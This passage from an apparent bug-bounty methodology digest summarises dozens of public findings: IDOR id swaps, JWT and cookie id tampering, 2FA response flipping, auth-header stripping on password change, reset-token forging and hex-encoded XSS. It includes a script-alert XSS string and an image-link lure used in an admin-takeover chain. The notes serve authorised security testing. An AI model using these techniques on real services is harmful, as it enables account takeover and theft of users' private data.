- Approach/how-found: deliberately targeted `ads/graphql` because it had been vulnerable many times before; found IDOR — swapping the user id returned the target's archived (no-longer-public) stories.
- Test: revisit endpoints with a HISTORY of vulns (they regress). "Archived / insights / ads / story-grid" graphql surfaces often expose time-private content via a swappable user id.
- Q: "Has this endpoint been vulnerable before (regression-hunt it)? Does an ads/insights/archive graphql expose archived/private content via a swappable user id?"

### [213] Larksuite — drive files referenced by a token (public/private); the new "footer" image feature's save request carries the file token → swap to a victim's private token → download private file — Imran (imunissar786) [DUP reinforcement: file-token swap + new feature reuses the unguarded mechanism]
- Where: Larksuite email "footer" image upload; the save POST includes the uploaded file's token; each drive file has a public/private token.
- Approach/how-found: daily-checked his favorite program for new features; the footer feature gave an uploaded image a file token, then a second POST saved it by token. Replacing the token with another user's private file token → broken image → "view image" → the private file downloaded without restriction.
- Test: file-token access where the token is the only guard → swap to other tokens; newly-added features tend to reuse the file-token mechanism without ownership checks. "Broken image → view image → download" surfaces the private file.
- Q: "Does a (new) feature reference files by a token not checked for ownership? Can I swap to a private file's token to download it? Do new features reuse an existing unguarded file-reference mechanism?"

### [214] Unsubscribe link — `email` param is hex of the UPPERCASE email; re-encode any email → unsubscribe anyone (IDOR), and smuggle an XSS payload through the same encoded field — Neh Patel [NEW ★ decode opaque params (hex), then both IDOR and XSS through the field]
- Where: marketing email "unsubscribe" link; `email` param = hex-encoded UPPERCASE email.
- Approach/how-found: the param used only A–F/0–9 → recognized hex; decoding gave his email in all caps. Uppercasing+hex-encoding any email → unsubscribe that user (IDOR). Then uppercasing+hex-encoding `<script>alert(document.domain)</script>` → XSS (the encoding bypassed filters).
- Test: decode opaque params (try hex/base64/url); if it's a transformed email/id, swap it (IDOR). The same encoded field is an XSS smuggling channel — encode the payload to bypass filters. Note any case-normalization quirk (must uppercase here).
- Q: "Is this opaque param just hex/base64 of an email/id I can swap? Can I smuggle XSS through the same encoded field (matching its case/format) to bypass filters?"

### [215] monkeytype — socket.io `mp_chat_message` carries a client-set `from.id/from.name` → impersonate any user/system; `/checkLeaderboards` POST trusts client `uid`/`name`/`wpm` → inject arbitrary leaderboard entries — Tyler Butler [NEW ★ websocket sender-identity spoof + client-supplied uid in result POST]
- Where: monkeytype socket.io `mp_chat_message` (`from`:{id,name}); `POST /checkLeaderboards` (client `uid`,`name`,`result.wpm`).
- Approach/how-found: the tribe-chat socket message includes a client-supplied `from` identity not bound to the authenticated socket → change `from.name`/`from.id` to impersonate any user or `system`. The leaderboard endpoint accepted a client-supplied `uid`/`name`/`result` → forge any user at the top with any wpm.
- Test: WebSocket/socket.io messages carrying a client-set sender id/name = impersonation (server doesn't bind to the socket's authenticated user). Result/score/leaderboard POSTs that take a client `uid` → write others' data. Test realtime/socket channels, not just HTTP.
- Q: "Does a websocket/socket.io message carry a client-set sender id/name the server doesn't bind to my session? Does a result/score POST trust a client-supplied uid I can set to any user?"

### [216] Marketing SaaS — static, never-expiring `accessToken` header identifies the account (swap = IDOR); it leaks in the Referer when a template fetches an external image → 3rd-party logs capture it → full ATO — Tuhin Bose [NEW ★ static token + Referer-leak-to-third-party = ATO]
- Where: `PUT /api/account/general-info/` (and others) authorized by an `accessToken` header; email-template external-image fetch leaks `accessToken` in the Referer.
- Approach/how-found: profile updates used a separate `accessToken` header; swapping it to a 2nd account modified that account (IDOR), and the token was static (same after logout). Leak vector: adding an external image URL to an email template made the client fetch it with the `accessToken` in the Referer (seen via Burp Collaborator) → the third-party image host's logs capture the victim's token → ATO.
- Test: hunt static/non-expiring tokens in headers/params that identify the account (swap two accounts to confirm IDOR). Then find a leak path: external-resource fetches (images, avatars, webhooks) that put the token in the Referer/URL to attacker-controlled hosts (Collaborator) → harvest → ATO.
- Q: "Is there a static, non-expiring token (header/param) that identifies my account? Does any feature send it in a Referer/URL to a third party (image/webhook) where I can harvest a victim's token → ATO?"

### [217] E-commerce (3M users r/w) — hidden checkout-address JSON endpoint; remove `sessid`+CSRF (server checks only `Ud` presence, not content) → swap `c=customer_id` to read; for write, reuse the victim's CSRF token harvested during read — Madari [NEW ★ hidden sibling endpoint + presence-only check + read-harvested token enables write]
- Where: hidden `GET /checkout/adv/address/view` (vs the secure profile endpoint); cookies `ud`, `c=CUSTOMER_ID`, `XSSRF-TOKEN`, `sessid`.
- Approach/how-found: the visible profile-address endpoint was secure, but a hidden checkout-address JSON sibling wasn't. Removing `sessid` + `XSSRF-Token` still returned data (server only verifies the PRESENCE of `Ud`, not its value) → swap `c` (customer_id) → read any user's PII. Write (edit address) wasn't cookie-authorized — it keyed on the CSRF token in the POST, which he'd already captured during the read → substitute → write 3M users' data.
- Test: hunt hidden/sibling endpoints for the same data (checkout vs profile) — the less-visible one is weaker. Try REMOVING session/CSRF params (servers often check presence, not content). When read and write use different authz (cookie vs CSRF token), harvest the token during the read to unlock the write.
- Q: "Is there a hidden checkout/API sibling of a protected endpoint? Does removing sessid/CSRF still work (presence-only)? Does write key on a token I can harvest during read?"

### [218] Fuzz + IDOR = admin takeover — ffuf `/api/FUZZ` → `user/users`,`user/updateuser`; fuzz PARAMS → `role`; read leaks users by role, update accepts `role:6→1` → self-promote to Super Admin — Gonzalo Carrasco [NEW ★ fuzz endpoints AND params; role mass-assignment privesc + "balancing" requests]
- Where: `/api/user/users`, `/api/user/updateuser`; param `role` (6=low, 1=admin); JWT taken from a low-priv login.
- Approach/how-found: ffuf'd `/api/FUZZ` (unauth) → found user endpoints. POST needed auth → grabbed the JWT from a low-priv session. "Balanced" the request (fix `Content-Type`/`Accept`, add a random JSON param) to get a clean 200. Then fuzzed PARAMETERS → discovered `role`. `user/users` with `role:6` dumped all low-priv users; `user/updateuser` accepted `role:1` on his own account → Super Admin.
- Test: fuzz both endpoints AND parameters (`role`,`is_admin`,`type`). When an update endpoint accepts a role/privilege field, set it to admin (mass-assignment privesc). "Balance" requests (correct headers + a dummy param) to coax real responses out of a stubborn API.
- Q: "Can I fuzz `/api/FUZZ` for hidden user/update endpoints? Does a write endpoint accept a `role`/privilege param I can set to admin? What hidden param controls role (fuzz the body)?"

### [219] Topcoder — multi-checkpoint BOLA: swapping only the body user-id failed; corrupting the API id in the HEADER (last char→letter) WHILE swapping the user-id disabled the cross-check → victim PII — can1337 [NEW ★ tamper ALL ids together; corrupting one can disable its check]
- Where: Topcoder forum "Watch Thread" API (different host, no Auth header) — API-defined ID in the request header + forum user-id in the body; ids public on profile/source.
- Approach/how-found: the API validated MULTIPLE identifiers. Swapping just the body Topcoder id did nothing. Changing the header ID's last digit to a letter (corrupting it) AND swapping the body user-id to the victim's → the API returned the victim's email/name/account_id. The required ids were publicly visible on profiles and page source.
- Test: when one id-swap "fails," the API may enforce several checkpoints (header + body). Tamper them TOGETHER — and try corrupting/blanking one (a malformed checkpoint id sometimes disables that check). Harvest the ids from public profiles/source.
- Q: "Does this API validate more than one id (header + body)? If swapping one fails, does corrupting/blanking the header id while swapping the body id break the cross-check? Are the ids public?"

### [220] Shopify-stack credit coupons — CORS-preflight `OPTIONS /api/v1/client_info?email=&external_id=…` switched to GET returns the user's full coupon/credit data; swap email+incremental external_id (leaked via reset) → any user — Jai Sharma [NEW ★ HTTP verb tampering on the preflight OPTIONS + cross-subdomain read]
- Where: `OPTIONS→GET /api/v1/client_info?email=&external_id=&customer_token=&merch_id=` on subdomain B, returning data created on subdomain A.
- Approach/how-found: a preflight `OPTIONS` call carried `email`+`external_id`+token and returned 204. Changing the verb to GET returned everything the user created on the OTHER subdomain (credit coupons, history, expired, balance). Swapping `email`+`external_id` → other users; `external_id` is incremental + the endpoint had no rate limit, and the same `external_id` is exposed in the password-reset flow → easy enumeration.
- Test: inspect CORS-preflight OPTIONS requests — they reveal identifier-bearing endpoints; change the verb (OPTIONS→GET/POST) to pull real data. Test cross-subdomain reads (data created on A fetchable via B). Incremental ids + reset-flow leakage = enumerable.
- Q: "Is there a preflight OPTIONS endpoint with email/id params I can switch to GET? Is the id incremental and leaked via reset? Can subdomain B's API read subdomain A's data?"

### [221] Bugcrowd e-commerce — an endpoint that (unlike its siblings) needs NO auth cookie converts points→coupon by Email + external_id; external_id is fixed-prefix (only last T-6 random) → brute (no rate limit), or harvest from the reset token — Abhind [NEW: spot the odd-one-out unauthenticated endpoint + reduce keyspace by fixed prefix]
- Where: unauthenticated points→coupon endpoint keyed by `Email` + `external reference ID`.
- Approach/how-found: noticed one API behaved differently — it required no auth cookies. The external ID was random only after the first 6 chars → brute the T-6 tail (no rate limit) alongside an email list (Intruder). Alternatively the external ID is appended in the forgot-password URL token (saved in browser history).
- Test: flag any endpoint that skips the auth its siblings require. Cut keyspace by finding the fixed prefix (brute only the random tail). Reset/forgot tokens frequently embed the exact id you need.
- Q: "Does any endpoint skip the auth cookie its siblings require? Is the 'random' id mostly a fixed prefix (brute the short tail)? Does a reset token leak the id?"

### [222] HackerEarth — self-XSS in name promoted to ATO: `setup-profile` POST selects the account by an `email` field → set victim's email + XSS payload → payload stored on the victim, executes for them — Jefferson Gonzales (swag) [DUP reinforcement: email-keyed profile write turns self-XSS into victim-XSS]
- Where: `POST /api/sprint/v1/setup-profile/` with `first_name`(XSS payload) + `email`(account selector).
- Approach/how-found: name field gave only self-XSS (no view-other-profile). But the setup-profile request identified the account by an `email` in the body → swapping it to the victim's email wrote the XSS payload into the victim's profile → executed in their session → ATO (only the victim's email needed).
- Test: when a profile-write request picks the account by an email/id in the body, you can write attacker-controlled data (incl. an XSS payload) into a victim's profile → promotes self-XSS to stored-XSS-on-victim → ATO.
- Q: "Does the profile-write request select the account by an email/id I can swap? Can I write my self-XSS payload into a victim's profile via that selector to escalate to ATO?"

### [223] Facebook — closed-group membership oracle: the add-member error differs ("Already a Member" vs "Cannot add member") → swap `gid`+`aid` on mtouch.facebook.com to reveal whether anyone is in a confidential group — Muhammad Sholikhin ($3,000) [NEW ★ error-message differential as membership oracle]
- Where: `POST /a/group/?gid=GROUP_ID&aid=USER_ID&refid=18` on mtouch.facebook.com.
- Approach/how-found: store an add-member request for a group he manages, then swap `gid` to the target group and `aid` to the target user. If the user isn't a member → error "Cannot add member"; if they are → "Already a Member" → a reliable oracle for confidential closed-group membership.
- Test: error-message differentials are oracles — "already a member/exists/duplicate" vs "cannot/forbidden" leaks confidential membership/existence. Use add/invite/duplicate endpoints to probe relationships by swapping the two ids.
- Q: "Does an add/invite/create action return a distinguishable 'already exists/already a member' error that leaks confidential membership or existence? Can I swap the group+user ids to probe any relationship?"

### [224] HackerOne program — user-id swap failed, but the payment-receipt UPLOAD URL had a numeric file id; swap/brute → others' receipts (signature, PayPal, home address); EXIF GPS not stripped = bonus PII — N1GHTMAR3 (swag, High) [DUP reinforcement: attack the FILE id, not user-id; chain EXIF]
- Where: payment-receipt image URL with a numeric file id.
- Approach/how-found: classic user-id Match&Replace failed; pivoted to the uploaded FILE's numeric id in the receipt URL → uploaded from a 2nd account, viewed via the 1st → IDOR. Intruder over the numeric id → all 200s held customer signature, PayPal address, home address. Bonus: the uploaded image's EXIF (GPS) wasn't stripped → extra PII.
- Test: don't limit IDOR to user-id — test FILE/image/document/receipt ids in upload URLs (often numeric, unprotected). Brute the id. Check uploaded images for un-stripped EXIF (GPS/device) as bonus PII to raise severity.
- Q: "Is there a file/image/receipt id (not user-id) I can swap/brute to read others' uploads? Is EXIF metadata (GPS) stripped from uploaded images?"

### [225] JWT account-number swap — payload `id` is the account number; pre-login email-existence check leaks the victim's id (`email=victim&id=123456`) → ATO — Filipe Azevedo ($3,000) [DUP reinforcement: id-in-JWT-payload + pre-login id leak]
- Where: session JWT whose payload `id` = account number; the "enter email → Next" pre-login step.
- Approach/how-found: the only difference between two accounts' JWTs was the payload `id` (= account number) → swapping it accessed any account (server trusted the payload id). Victim id source: the pre-login flow (email → Next) sent `email=victim@…&id=123456` when the email existed → harvest any user's id.
- Test: decode JWT payloads for an account id/number and test whether swapping it is honored (is the signature actually enforced/bound?). Pre-login email-existence / "next" steps frequently leak the user id in the request/response — harvest victim ids there.
- Q: "Does the JWT payload carry a swappable account id (is its signature truly enforced)? Does the pre-login email check leak the user's id?"

### [226] Self-XSS → org takeover: state-transition surfaces a new IDOR list + image-injection delivery — r29k [NEW: state→new-endpoint + image-injection]
- Where: employee-management app; sticky-note `title` = stored (self) XSS.
- Approach/how-found: self-XSS only hit his own employees; cross-org share was 403. Marking a task **completed** (from an employee account) made an admin page "List all completed tasks" appear with a **6-digit id URL** — an IDOR: open it from another org, change the id → see anyone's completed tasks (including the one carrying his XSS). To avoid "send the victim a link," he used **image injection** in limited-HTML profile posts (`<a href="…/tasks?tab=completed&taskID=123456"><img src="evil.jpg"></a>`) visible to cross-org followers → click → XSS fires → CSRF-steals the admin csrf-token → POSTs `/admin/user` to add an attacker admin.
- Test: change an object's STATE (complete/archive/publish/submit) and watch for a NEW list/report endpoint that's IDOR-able; in limited-HTML fields, disguise a malicious URL behind `<a><img></a>` to remove the "send a link" friction.
- Q: "Does completing/archiving/publishing an object expose a new list/report URL with a guessable id? Can `<img>/<a>` in a comment/post hide my exploit URL so victims click it naturally?"

### [227] Facebook — remove-cover action keys only on `note_id`, ignoring the document's "no one may edit" setting → swap to victim's note_id to strip their cover (Documents & Notes) — Muhammad Sholikhin ($1,500) [NEW: sub-resource action ignores parent permission settings]
- Where: `POST /notes/composer/remove_cover_photo/`; `note_id` (Documents and Notes).
- Approach/how-found: a victim's document was set to disallow edits. He created his own document, captured the remove-cover request, and swapped `note_id` to the victim's → the cover was removed despite the no-edit setting (the action validated only the object id, not the parent's permissions).
- Test: remove/edit/delete-sub-resource actions that key only on the object id ignore the parent object's edit/permission flags → swap the id to modify objects the UI says you can't edit.
- Q: "Does a remove/edit-subresource action key only on the object id and ignore the parent's edit/permission settings? Can I swap the id to modify a 'non-editable' object?"

### [228] Google clientauthconfig: unauth brand lookup by project_number (even org-internal) — xdavidhu [NEW: semi-public id metadata leak]
- `GET /v1/brands/lookupkey/brand/<project_number>?readMask=*` on clientauthconfig.googleapis.com had no access control → returns any brand's info, including `isOrgInternal:true` ones that the OAuth flow refuses to reveal. The `project_number` (=brand_id) leaks from an exposed API key when you send it to an API not enabled on its project.
- Q: "Is there a metadata/brand/consent lookup endpoint with no authz keyed by a semi-public id (project_number/app_id)? Can that id be derived from a leaked API key's error?"

### [229] Facebook — `LiveProducerProviderRefetchQuery` (owner-only) keys on `videoID`; swap to another user's livestream → private broadcast data (blocked list, config, charity) — Geva-Kun [NEW: owner/producer config query keyed only on object id; crawl the graphql folder]
- Where: FB GraphQL `LiveProducerProviderRefetchQuery`; `videoID`.
- Approach/how-found: while using the livestream feature he intercepted requests; the producer-only refetch query took `videoID` → swapping it to another user's livestream returned their private producer data.
- Test: "producer/owner/admin config/refetch" GraphQL queries are owner-scoped by intent but often key only on the object id → swap it. Use Burp live-passive-crawl and inspect the sitemap `graphql` folder (and intercept on button clicks) for such queries.
- Q: "Is there an owner/producer/admin-only config/refetch query keyed on an object id I can swap? Have I crawled the graphql folder + intercepted button-click queries for suspicious ones?"

### [230] SSO — session cookie embeds a repeated sequential 5-digit user code (`…|47402|…`); decrement/increment it → log straight into other accounts (even a user in China) — Sankalpa Acharya ($500) [NEW ★ dissect the cookie field-by-field; sequential code = ATO]
- Where: `Set-Cookie: example_token=1|rand|47402|47402|rand|` (a repeated 5-digit user code).
- Approach/how-found: login returned no JWT, so identity lived in cookies. Swapping each cookie field between two accounts isolated the identifying token; inside it a 5-digit code (47402) repeated and differed by 1 from the second account (47403) → replacing it logged him into other accounts (47401 = a Chinese user's account).
- Test: dissect session cookies field-by-field (swap each between two accounts to find the identifier). A repeated numeric segment is likely the user id — test sequentiality (±1) → direct ATO.
- Q: "Does the session cookie embed a sequential user code (often repeated within the token)? Can I inc/dec it to log into other accounts?"

### [231] "Some ways to find more IDOR" (methodology) — `/…/self/…` → replace `self` with your user id → site-wide IDOR incl change-email → ATO; fuzz chars (`/`, `%20 %09 %0b %0c %1c-%1f`, %00→%ff) to break authz regex; don't drop GraphQL from scope — Thái Vũ [NEW ★ three reusable IDOR-discovery methods]
- Where: APIs like `/ngprofile/aggregate/self/fullProfile`; `/accounts/{id}`; `/api/applications/{id}`; `/graphql`.
- Approach/how-found: (1) "No ID, no worry" — APIs with a `/…/self/…` segment: replace `self` with your user id (from the JWT) → works; then swap to incremental user ids → read/modify/delete anyone, including a Change-Email API → chain forgot-password → ATO all accounts. (2) "Don't just replace ID" — when a swap returns "Invalid account number"/401, append a character: `/` (e.g. `/accounts/0001176361/`) or whitespace/control bytes (`%20 %09 %0b %0c %1c %1d %1e %1f`, fuzz %00→%ff) → breaks the server's regex/authz pattern → full data. (3) "Don't ignore GraphQL" — if Burp history looks empty, all traffic may be `/graphql`; add it to scope → found 2 IDORs by plain id replacement.
- Test: replace literal `self`/`me`/`current` path segments with your numeric id, then enumerate. When an id-swap is blocked, append `/` or whitespace/control chars and fuzz %00–%ff to defeat the authz regex. Never exclude `/graphql` from scope.
- Q: "Do any endpoints use a `self`/`me` segment I can replace with a raw user id? When a swap is rejected, did I fuzz trailing chars (`/`, %00–%ff) to break the regex? Did I keep GraphQL in scope?"

### [232] Instagram — media-by-`MEDIA_ID` GraphQL returns private/archived posts/stories/reels/IGTV (+regenerated CDN); when a second endpoint enforced a token, `access_token=null` bypassed it — Mayur Fartade ($30,000) [NEW ★ media-id brute + null-token bypass]
- Where: Instagram GraphQL `doc_id=…` with `query_params.id=[MEDIA_ID]`; an `access_token` param on a second endpoint.
- Approach/how-found: the media fetch keyed only on MEDIA_ID with no ownership check → private/archived media details + a fresh CDN URL (brute MEDIA_ID to harvest, then filter private/archived). A second endpoint returned `data:null` for others' media when a valid access_token was sent — but setting `access_token=null` returned the data (the null token skipped the ownership filter).
- Test: media-by-id GraphQL leaks private/archived content and regenerates CDN URLs → brute media ids. When a token gates it, try `access_token=null`/empty/removed — a null/absent token often bypasses the ownership check entirely.
- Q: "Does a media-by-id query return private/archived content and a fresh CDN URL? If a token blocks it, does setting the token to null/empty/removing it bypass the check?"

### [233] $2 IDOR: welcome.php?...&id= → other users' profile — evanricafort [DUP basic]
- Classic PHP `&id=` swap reveals other users' (whois-preset) profile data. Low value but reinforces: enumerate the `id` param on legacy `.php` profile pages; your own id returning your data proves the param is the object ref.

### [234] Facebook Leads Center — chain two GraphQL IDORs: `pageID` → any page's leads-form details (leaks `form_id`); `pageID`+`form_id` → total leads captured → spy competitors' winning lead ads — Amine Aboud [NEW ★ chain IDOR-1 leaks the id IDOR-2 needs]
- Where: FB Leads Center GraphQL `doc_id=3388026827877743` (`pageID`→form details incl. form_id) and `doc_id=3547538925278909` (`pageID`+`form_id`→lead counts).
- Approach/how-found: first IDOR returns the leads-form details (and form_id) for any `pageID`; feeding that form_id into the second IDOR returns the total leads captured → a competitor could copy profitable lead ads without spending a dollar.
- Test: chain IDORs where the first leaks the child id (form_id) the second requires. Ads/leads/business GraphQL keyed by `pageID`/business id usually skips ownership → swap it; then pivot to sibling queries needing the leaked child id.
- Q: "Can I chain a first IDOR that leaks a child id (form_id/campaign_id) into a second IDOR that needs it? Are ads/leads/business endpoints keyed by a swappable page/business id?"

### [235] API hunting methodology + 2 finds — JS-mined SPA APIs; bypass Akamai via an unprotected Spanish MIRROR; GetProfile needs `userName` (brute first-initial+surname → PII); `/showAdmins` leak → replay shape to `/AddOrUpdateAdmin` → admin — Bendtheory ($1k + $3k) [NEW ★ deep API-recon playbook + WAF-mirror bypass + leak-then-replay privesc]
- Where: per-app SPA APIs inside a main web app — `/MyExampleApp/api/Account/GetProfile` (needs `userName`); `/xyzadmin/api/Users/showUsers|showAdmins|AddOrUpdateAdmin`.
- Approach/how-found: enumerate aggressively — Google dorks (`inurl:register/admin/panel`, copyright `intext`, `-ext` to drop static), BurpJSLinkFinder, a custom wordlist built from the whole Burp project (`burplist.py`), gau/qsreplace/httpx, kiterunner, urlscan.io. Example 1: ffuf was blocked by Akamai, so he scanned an unprotected Spanish production MIRROR; JS revealed Account endpoints; Intruder over them found GetProfile returning `Invalid userName` → supply `userName`, brute first-initial+common-surname → leak PII; replay valid usernames on other endpoints to escalate. Example 2: an empty `/xyzadmin` page whose main.js held 450 URLs incl. `showUsers`/`showAdmins` (dumped everyone) and `AddOrUpdateAdmin`; he reconstructed the POST body from the leaked admin JSON + a JS `createAdmin()` function → self-added as admin → full control.
- Test: read JS not just for endpoint strings but the CODE that builds each request (param names, body shape). When a WAF blocks scanning, find an unprotected mirror/origin/localized subdomain. Brute usernames from initial+surname lists. When `/showAdmins`-type leaks reveal an object's shape, POST that shape to an add/update-admin endpoint for privesc.
- Q: "Are there per-app APIs (each with own authz) inside the main app? Does JS reveal the exact param/body to call an endpoint? Is there an unprotected mirror to dodge the WAF? Can a leaked admin-object shape be replayed to an add/update-admin endpoint?"

### [236] Workplace from Facebook — `accounts_self_invite` keyed by `community_id`; self-invite signup never enforces the email domain → join ANY company's environment with a personal Gmail; a companion endpoint leaks any company's community_id — Marcos Ferreira ($27.5k) [NEW ★ multi-tenant self-invite tenant-id swap]
- Where: `POST /at_work/accounts_send_notification` (get code) then `POST /at_work/accounts_self_invite` with `identifier`(gmail), `nonce`(code), `community_id`(target company).
- Approach/how-found: analyzed the Workplace Android app. The self-invite signup didn't verify the email was approved by the admin, and the account was created in whatever `community_id` you supplied → swap it to join any company's Workplace with a personal email (files, groups, photos, employees). community_id was brute-forceable; later he found an endpoint that returns any company's community_id.
- Test: multi-tenant "self-invite / join organization" flows keyed by a tenant/community/org id → swap it to enter other tenants when the email domain isn't enforced. Hunt a companion endpoint mapping company name → tenant id.
- Q: "Does a self-invite/join flow admit me to another tenant by swapping a community/org id without enforcing my email domain? Is there an endpoint that discloses any org's tenant id?"

### [237] Uber Eats analytics IDOR via locationUUIDs + Burp Match&Replace to render it $2,000 — 0xprial [NEW: M&R to render victim data in the real UI]
- GraphQL `locationUUIDs` param; swap to another restaurant's UUID → their analytics, but the raw JSON wasn't human-readable. He set a Burp **Match & Replace** rule (his UUID → victim's, plus currency) so the **legit frontend parses the victim's data into the normal dashboard** (sales by hour/item, CSV export).
- Test: when an IDOR returns raw/unreadable data, use Burp Match&Replace (your id → victim's) so the application's own frontend renders it cleanly.
- Q: "Can I set a Match&Replace (my id → victim's) so the app's own UI renders the victim's data, turning a raw-JSON IDOR into a clean, demoable view?"

### [238] YouTube — recover a video's HIDDEN dislike count from `averageRating` via `POST /youtubei/v1/player` `videoId=<victim>`: rating + known likes → solve for dislikes — Alessandro Rumampuk (Google VRP) [DUP-reinforce of the YouTube hidden-metric family: a computed field leaks the hidden one]
- Where: `POST /youtubei/v1/player?key=...` body `videoId:<victim_video_id>`; response `averageRating` (1–5 scale).
- Approach/how-found: even with dislikes hidden, the player endpoint returned `averageRating` for any video id; since rating is a function of likes:dislikes, knowing the (visible) like count lets you algebraically recover the hidden dislike count.
- Test: hidden counts can be reconstructed from any DERIVED/aggregate value the API still exposes (average, ratio, percentage, rank, total). Don't only look for the raw field — look for math that reveals it.
- Q: "Is there an average/ratio/percentage/total that, combined with a visible value, lets me compute the field that's supposed to be hidden?"

### [239] Change-password ATO — remove the `X_auth_credentials` header + `currentPassword` param and set the victim's email in the body → 200 OK, victim's password changed (email-keyed, no-auth) — 0x2m [NEW ★ strip auth header + current-password to force email-keyed reset]
- Where: change-password request with header `X_auth_credentials` + `currentPassword` param + `email` in body (found in sandbox.site.com).
- Approach/how-found: removing BOTH the auth header and the `currentPassword` param, while changing the body email to the victim's, returned 200 and changed the victim's password → login with victim email + new password = ATO, zero interaction.
- Test: on change-password, try REMOVING the auth header and the `currentPassword` param while setting a target email in the body — servers sometimes fall back to an email-keyed, unauthenticated password change. Always test sandbox/staging variants.
- Q: "If I strip the auth header + currentPassword and set the victim's email in the change-password body, does it still succeed (email-keyed, no-auth reset)?"

### [240] Facebook — analyst (read-only) role can perform an admin-only business-fyi (COVID) message write via GraphQL, incl. a customer-facing button to attacker URL — Ahmad Talahmeh ($750) [NEW: test every write under a low/read-only role; customer-facing content = phishing]
- Where: FB `POST /api/graphql/ doc_id=2964825706964540` (business_fyi update); `page_id`/`actor_id`.
- Approach/how-found: the COVID "business fyi" message update is supposed to need high page permission, but an analyst (read-only) role could execute the mutation → set a customer-facing message and a button linking to an attacker-controlled URL.
- Test: replay every write action under a LOW/read-only role (analyst/viewer/member) — the server may enforce the role on the UI but not on the specific mutation. Customer/visitor-facing message/banner writes are phishing vectors.
- Q: "Can a read-only/analyst role perform a write that should require admin? Does it let me set customer-facing content (message/banner/button/URL)?"

### [241] Synack medical app — IDORs hidden inside URL-ENCODED/nested data (patient details, receipt, appointment count); 2FA bypass by flipping the response (`status:false→true`, 401→200) — Manas Harsh [DUP reinforcement: ids in encoded data + 2FA response-tamper]
- Where: receipt/appointment endpoints (numeric ids inside URL-encoded data); 2FA verify endpoint (JSON `status`).
- Approach/how-found: the IDORs were "simple number changers" but the ids lived inside URL-encoded/nested request data → swap → other patients' details, receipts, appointment counts. 2FA: a wrong code returned `{"status":"false"}` with 401; changing the response to `{"status":"true"}` and 401→200 logged him in.
- Test: look for numeric ids inside URL-encoded/base64/nested bodies, not just plain query params. For 2FA/OTP, tamper the response (status false→true, 401→200) — the client may trust the verdict.
- Q: "Are there numeric ids buried in URL-encoded/nested request data I can swap? Can I flip the 2FA/verify response (false→true, 401→200) to bypass it?"

### [242] thexssrat — "request an item for ANOTHER user" IDOR on a new approval-workflow feature (spotted via a program-update email); methodology = pwnFox containers + Burp Authorize, invite-to-org as a BAC signal, admin-vs-employee testing — TheXSSRat (€2,000 + €750) [NEW ★ be-first-on-new-features + approval-request IDOR + a reusable BAC test rig]
- Where: a B2B multi-tenant app; "invite people to your organization" feature; later a "request an item, manager approves" feature; the €750 bug = requesting items on behalf of other users.
- Approach/how-found: treated "invite others to my org" as a BAC/IDOR signal; built 2 companies × {Admin, Employee}, used **pwnFox** containers to hold parallel sessions and **Burp Authorize** to replay one role's requests with another's headers (statuses: ENFORCED / Is-Enforced? / Bypassed — always confirm "Bypassed" manually in Repeater). Found tenant-isolation + employee→admin BAC issues. Months later an Intigriti "updates to <program>" email announced a new request-approval feature; being first, he tried **requesting items for other users** → IDOR (€750).
- Test: subscribe to program-update emails and rush new features (least-tested). For any "create/request X (for me)" action, try setting the beneficiary/owner to a victim. Stand up a permanent rig: containers (pwnFox) + Burp Authorize, with one account per role and per tenant, to sweep BAC/IDOR fast.
- Q: "Did a program just ship a new feature I can test first? In this 'request/create for me' action, can I set the target user to someone else? Does Authorize show 'Bypassed' when I replay employee/tenant-A requests as admin/tenant-B (confirmed manually)?"

### [243] YouTube — read like/dislike counts the owner HID: add the victim video as a "featured video" in YouTube Studio → Customization → Layout; the layout API response returns `metrics{viewCount,likeCount,dislikeCount}` — Alessandro Rumampuk (Google VRP) [NEW ★ a SECONDARY feature's response bypasses the privacy toggle on the primary object]
- Where: YouTube Studio → Customization → Layout → "Add featured video for returning subscribers" → set `watch?v=<victim_video_id>`; response JSON `metrics{...}`.
- Approach/how-found: the public watch page honored the creator's "hide like/dislike" setting, but the Studio layout/featured-video endpoint, when pointed at any video id, returned the full `metrics` object including the hidden like/dislike counts — the privacy flag was enforced on one surface but not this one.
- Test: when an attribute is hidden/private on the main view, look for OTHER endpoints that embed the same object (featured/embed/preview/share/export/analytics widgets) — they frequently return the full object server-side, ignoring the per-field privacy flag.
- Q: "Is this 'hidden' field still returned by a different endpoint that references the same object (embed/featured/export/analytics)? Is the privacy flag enforced everywhere or just on the canonical view?"

### [244] YouTube Studio — hidden like/dislike counts leak: analytics POST keyed on `videoId`; swap to a victim video whose counts are hidden → counts in response — bloggerrando [NEW: privacy toggle is UI-only; analytics API still returns the metric]
- Where: YouTube Studio analytics `POST {"entity":{"videoId":X}}` → response `metrics.likeCount/dislikeCount/viewCount/commentCount`.
- Approach/how-found: even when an owner sets "Don't show how many viewers like/dislike", the Studio analytics endpoint returns those metrics for any `videoId` swapped in — the privacy setting only hides the public widget.
- Test: when a UI privacy toggle "hides" a metric/field, check whether the analytics/detail API still returns it for an object id you don't own.
- Q: "Does hiding a field in the UI actually remove it from the API response, or can I read it by swapping the object id into the analytics/detail endpoint?"

### [245] Google AppSheet — a "fixed" IDOR still alive under POST (fixed only in GET); repro requires the `version` body param to match the TARGET app's version → returns owner email + firebase token — Sudhanshu Rajbhar ($500×2) [NEW ★ GET↔POST fix-bypass + version-param-must-match repro pitfall]
- Where: appsheet.com app-details POST endpoint; body params include `appId` + `version`; also reflected XSS on withgoogle.com via paramspider+kxss.
- Approach/how-found: a previously-reported IDOR was fixed in the GET method but still worked via POST (with data in the body) → response leaks owner email, firebase token, etc. Google couldn't reproduce (forbidden with another appId) because the IDOR only works when the body `version` matches the target app's version (his app `1.00003` vs the staff app `1.000010`); supplying the correct version made it reproduce. Reflected XSS found by piping subdomains → ParamSpider → kxss.
- Test: when an IDOR is "fixed," re-test other HTTP methods (GET↔POST). When a triager can't reproduce, look for a body param (`version`/`build`/`apiLevel`) that must MATCH the target object's value — supply the right one. Use ParamSpider+kxss to mass-find reflected XSS.
- Q: "Is a 'fixed' IDOR still alive under a different method (GET↔POST)? Does reproduction need a version/build param matched to the target object? If one IDOR exists, where are the siblings?"

### [246] "Interesting ATO" — defeat an 'encrypted' password-reset token: it's a Zlib-compressed PHP-serialized blob (`...profile_id;s:8:"40884692"...`) and Zlib ignores bytes after the Adler32 checksum → forge token with victim's `profile_id` (+ a `Transaction_Token` found via JS/dir-brute) → reset any password — Mayank Pandey [NEW ★ crypto-quirk: trailing bytes after Adler32 are ignored; the id lives inside the "encrypted" token]
- Where: password-change flow using an opaque token = base64(Zlib(PHP-serialized `{timestamp, profile_id}`)); plus per-request `Transaction_Token` at `/php/user/<...>/`.
